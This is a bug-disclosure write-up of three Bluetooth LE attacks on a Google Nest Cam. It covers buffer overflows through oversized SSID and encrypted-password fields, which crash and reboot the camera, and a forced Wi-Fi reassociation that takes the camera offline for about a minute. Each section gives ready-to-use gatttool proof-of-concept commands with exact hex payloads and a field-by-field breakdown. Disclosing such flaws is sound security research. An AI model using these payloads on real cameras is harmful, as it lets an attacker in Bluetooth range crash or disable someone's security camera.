# Google-Nest-Cam-Bug-Disclosures

######-Buffer Overflow via SSID parameter-######
1. Proof of Concept
anon@ubuntu:~/nest$ gatttool -b 18:B4:30:5D:00:B8 -t random -I
[18:B4:30:5D:00:B8][LE]> connect
Attempting to connect to 18:B4:30:5D:00:B8
Connection successful
[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3a031201AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3b
Characteristic value was written successfully
Characteristic value was written successfully
[18:B4:30:5D:00:B8][LE]> 
(gatttool:20352): GLib-WARNING **: Invalid file descriptor.

2. Description
The payload attempts to set an SSID with a length of 1 byte and sends 16.
3a031201AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA = SequenceNum=3a + Type=0312 + Length=01 + Value=AA*16

3. Result
Crash and reboot back to operational state

######-Buffer Overflow via Encrypted Password parameter-######
1. Proof of Concept
anon@ubuntu:~/nest$ gatttool -b 18:B4:30:5D:00:B8 -t random -I
[18:B4:30:5D:00:B8][LE]> connect
Attempting to connect to 18:B4:30:5D:00:B8
Connection successful
[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3a03120b506574536d6172742d356e1a01AAAAAA
[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3b
Characteristic value was written successfully
Characteristic value was written successfully
[18:B4:30:5D:00:B8][LE]> 
(gatttool:20352): GLib-WARNING **: Invalid file descriptor.

2. Description
The payload attempts to set the encrypted wifi password with a length of 1 byte and sends 3.
3a03120b506574536d6172742d356e1a01AAAAAA = SequenceNum=3a + Type=0312 + Length=0b + ssidVal=506574536d6172742d356e + type=1a + length=01 + encPass=AA*3

3. Result
Crash and reboot back to operational state


######-Force Wifi Reassociation-######
1. Proof of Concept
anon@ubuntu:~/nest$ gatttool -b 18:B4:30:5D:00:B8 -t random -I
[18:B4:30:5D:00:B8][LE]> connect
Attempting to connect to 18:B4:30:5D:00:B8
Connection successful
[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3a03120b0a6574536d6172742d356e1a20232320
[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3becb824ba437c13233ac2ff78b1776456e47a01
[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3ca5787d2f5e53f394a512200228003210bc9253
[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3d48cada7a0d921d57b2d26ae89c3a04DEADBEEF
[18:B4:30:5D:00:B8][LE]> char-write-req 0xfffd 3e
Characteristic value was written successfully
Characteristic value was written successfully
Characteristic value was written successfully
Characteristic value was written successfully
Characteristic value was written successfully
[18:B4:30:5D:00:B8][LE]> 

2. Description
The payload attempts to change Nest Cam's associated SSID causing temporary disassociation from the current Wifi SSID. Without knowing the encryption key, a valid password can not be set.
char-write-req 0xfffd 3a03120b0a6574536d6172742d356e1a20232320	/	seqNum + 0312(type) 0b(len) + SSID + 1a(type) 20(len) + encPass
char-write-req 0xfffd 3becb824ba437c13233ac2ff78b1776456e47a01	/ 	seqNum + encPass(cont)
char-write-req 0xfffd 3ca5787d2f5e53f394a512200228003210bc9253	/ 	seqNum + encPass(cont) + 2002280032(constant) + 10(len) + authTag
char-write-req 0xfffd 3d48cada7a0d921d57b2d26ae89c3a04DEADBEEF	/	seqNum + authTag(cont) + 3a(UnknownType) 04(len) + DEADBEEF
char-write-req 0xfffd 3e					/	execute

3. Result
Camera dissociates from current wifi network to attempt association with newly set SSID. The camera goes offline for approximately 60-90 seconds before returning to the original Wifi network and resuming normal operation. No reboot or crash was observed.
